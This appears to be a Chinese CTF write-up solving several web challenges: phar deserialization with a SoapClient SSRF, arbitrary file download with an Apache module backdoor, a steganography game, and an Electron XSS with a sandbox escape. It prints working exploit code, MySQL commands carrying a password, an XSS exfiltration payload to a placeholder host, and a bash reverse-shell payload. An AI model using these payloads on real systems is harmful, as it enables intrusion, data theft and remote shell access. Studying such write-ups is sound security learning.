但是网站并没有公开说明这个函数可以触发phar反序列化，我是怎么知道的呢？
zsx师傅曾在他的文章[《Phar与Stream Wrapper造成PHP
RCE的深入挖掘》](https://blog.zsxsoft.com/post/38)写到，只要函数在底层调用了这个`php_stream_locate_url_wrapper`函数，那么就能触发phar反序列化，而`finfo_open`函数在底层恰好就是使用了这个函数。（其实这个点本地盲打也能触发，所以发现的话也不难）
ext/fileinfo/fileinfo.c:517
到此为止反序列化已经完整了，那么怎么进行ssrf呢？很容易联想到之前`wupco`出的easyphp中的`SoapClient`，所以就可以构造如下payload
    file_name = array(null, array('location' => "http://127.0.0.1/admin.php", 'uri' => "123", 'user_agent' => "heiheirnContent-Type: application/x-www-form-urlencodedrnContent-Length: 133rnrnip=47.90.204.28&port=2333&admin=123&clazz=ArrayIterator&func1=append&func2=append&func3=append&arg1=1&arg2=1&arg3=1rnrnrn"));
            $this->file_name = array(null, array('location' => "http://127.0.0.1/admin.php", 'uri' => "123", 'user_agent' => "heiheirnContent-Type: application/x-www-form-urlencodedrnContent-Length: 133rnrnip=47.90.204.28&port=2333&admin=123&clazz=SplStack&func1=push&func2=push&func3=push&arg1=1&arg2=1&arg3=1rnrnrn"));
        }
    }
    $o = new File();
    $filename = 'poc.phar';
    file_exists($filename) ? unlink($filename) : null;
    $phar=new Phar($filename);
    $phar->startBuffering();
    $phar->setStub("GIF89a");
    $phar->setMetadata($o);
    $phar->addFromString("foo.txt","bar");
    $phar->stopBuffering();
修改后缀为`gif`之后上传得到上传路径来触发
    php://filter/read=convert.base64-encode/resource=phar://upload/8256248f8bb97051ddea1f7946057e08/2d32ae0bbeb53285459d07235d464102.gif
直接得到flag
###  0x06 Cocktail’s Remix
**题目描述**
**题目解答**
访问 
发现回显的是 It Works!
所以尝试爆破路径
结果发现 
    User-agent: *
    Disallow: /info.php
    Disallow: /download.php
    Disallow: /config.php
存在任意文件下载漏洞 
参数是fuzz出来的`filename`（字典链接同上）
继续使用上述字典进行fuzz，筛选出有价值的信息如下
从`/etc/hosts`发现是存在内网的mysql服务器的
    # /etc/hosts
    127.0.0.1       localhost
    ::1     localhost ip6-localhost ip6-loopback
    fe00::0 ip6-localnet
    ff00::0 ip6-mcastprefix
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters
    172.77.120.11   MysqlServer
    172.77.120.10   f8a7f2ca8591
继续读源码
    # download.php
看到读出了MySQL的账号密码
    # config.php
还有一个phpinfo页面
    # info.php
在页面上没有发现常规漏洞，但是发现了一个与题目名称类似的扩展模块
所以尝试进行下载 `/usr/lib/apache2/modules/mod_cocktail.so`
先用file命令看了一下，发现是64位程序，所以使用IDA Pro直接来进行分析
直接定位到关键函数，可以看到其中使用了`popen`函数来执行经过`j_remix`函数处理的`reffer`变量，所以基本可以判定此处是存在一个命令执行的后门。
`j_remix`函数是调用了`remix`函数，看起来比较复杂，但应该是某种编码方式
此处使用IDA的findcrypt插件，直接发现了base64表，所以猜测是base64编码
那么接下来可以测一下这个后门，可以看到成功回显
可以看到没有权限写webshell
所以可能稍微麻烦一点，我们得用之前得到的mysql账号密码来查看数据库的内容
    mysql -hMysqlServer -udba -prNhHmmNkN3xu4MBYhm -e "show databases;" > /tmp/zero.txt && cat /tmp/zero.txt && rm /tmp/zero.txt
    mysql -hMysqlServer -udba -prNhHmmNkN3xu4MBYhm -e "use flag;show tables;" > /tmp/zero.txt && cat /tmp/zero.txt && rm /tmp/zero.txt
    mysql -hMysqlServer -udba -prNhHmmNkN3xu4MBYhm -e "use flag;select * from flag;" > /tmp/zero.txt && cat /tmp/zero.txt && rm /tmp/zero.txt
###  0x07 Game
**题目描述**
How fast can you play?
**题目解答**
直接查看源代码得到flag（假的，emmmm
view-source:
          Well done!，
          here is your flag:ON2WG5DGPNUECSDBNBQV6RTBNMZV6RRRMFTX2===      
base32后得到flag
    suctf{hAHaha_Fak3_F1ag}
既然是个游戏就有可能是改的开源代码，所以抱这这种想法就去找了源码，就找到了
然后从里面diff出不同点
    var acd = mysecretishere.iZwz9i9xnerwj6o7h40eauZ.png;
之后下载图片
    wget http://47.111.59.243:1081/iZwz9i9xnerwj6o7h40eauZ.png
分析之后发现是lsb隐写
    U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To/KeuHg8vKAxFrVQ==
使用3des解密即可得到flag
###  0x08 iCloudMusic-WriteUp
首先下载附件，可以看出是一个nodejs写的App，采用了electron框架。其实就是将网页封装为了一个App。所以还是一道web题。尝试对其逆向解包。
> mac环境
首先进入该App包目录。可以在以下目录发现一个app.asar文件，该文件为App核心代码。逆向其即可。在这里采用官方的解包就可以。
    # iCloudMusic.app/Contents/Resources/
    # 复制备份到工作目录
    cp ./app.asar /tmp/app.asar
    cd /tmp
    # 安装 asar 包
    npm install asar
    # 逆向app.asar
    asar extract app.asar app
    cd app
    # 安装App运行依赖
    npm install、
    # 启动App
    npm start
按以上步骤，即可以源码形式跑起来这个应用。
跑起来，大概看一下逻辑，发现存在一个向管理员反馈的接口。此时80%确定是一个xss题目了。然后再分析源码。可以发现250多行这里，有一个代码执行。其中是直接拼接了一些内容。然后使用view的`executeJavaScript`方法进行代码执行。
继续分析，可以管理员反馈接口处参数如下：
    id=2810583532
    &music={"header":"xxxx","title":"xxxx","desc":"xxx"}
    &code=612346
根据以上内容， 大胆猜测，小心求证。尝试对header进行注入(可以本地先尝试js_to_run代码注入后是否可以运行，然后再打远程)。
开启本地调试环境，加入调试代码。然后再运行。
    // index.js
    //在22行左右添加如下代码，开启开发者工具。
    mainWindow.openDevTools();
最终music的poc
    {"header":"'var t = new XMLHttpRequest;t.open('POST', '//eval.com:port', !0),t.setRequestHeader('Content-type', 'text/plain'),t.onreadystatechange = function() {  4 == t.readyState && t.status},t.send('test,hhhh');//};","title":"xxxx","desc":"xxx"}
此时xss成功get，但是尝试读了很多东西，发现没啥用。询问出题人才知道，这题要getshell。
electron有一个危害，就是可以直接调用系统api，所以可以直接getshell。但是尝试无果。最终发现，原来是view搞的鬼。正如之前所说，是调用view的方法，执行js。
分析可以发现，这个view是一个webview窗口，相当于是一个沙盒。默认是没有办法调用系统api的。
此时需要想办法来做一个沙盒逃逸。根据hint：contextisolation，以及文章，可以了解到。
由于contextisolation关闭，可以导致webview沙盒内与pr.js内变量在同一作用域，可以覆盖pr.js的变量。而且pr.js是不在沙盒运行限制内。所以，只要想办法覆盖掉pr.js的函数调用逻辑，即可绕过webview沙盒。
可以在main.js中，插入以下代码，开启webview沙盒的开发者工具。
    // main.js
    webview = document.getElementById("view");
    webview.addEventListener("dom-ready", function() {
      webview.openDevTools();
    });
比赛时，审request源码，动态跟逻辑，尝试了半天。最终还是太菜了。fuzz也尝试了。但是奈何自己考虑不周。
最后看了wp，才发现自己还是经验不足，学到了很多。
自己的payload：
    Function.prototype.apply=function(process){
            process.mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/XXXXXX/8080 0>&1"');
    }